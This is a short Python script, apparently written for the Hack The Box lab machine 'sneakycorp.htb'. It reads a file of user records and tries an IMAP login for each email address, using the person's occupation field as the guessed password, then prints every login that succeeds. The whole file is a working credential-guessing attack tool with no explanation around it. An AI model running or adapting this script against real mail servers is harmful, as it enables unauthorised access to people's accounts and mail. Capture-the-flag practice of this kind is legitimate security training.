from imaplib import IMAP4

with IMAP4(host="sneakycorp.htb", port=143) as client:
    status = client.noop()
    if (status[0] == 'OK'):
        print('IMAP server listening...')

        with open('./users', 'r') as user_data:
            for line in user_data:                
                data = line.split('|')            
                name = data[0]
                occ = data[1]
                city = data[2]
                email = data[3]
                try:
                    client.login(email.strip(), occ)
                    print("Successfull login", email, occ)
                except Exception as ex:
                    print(ex)
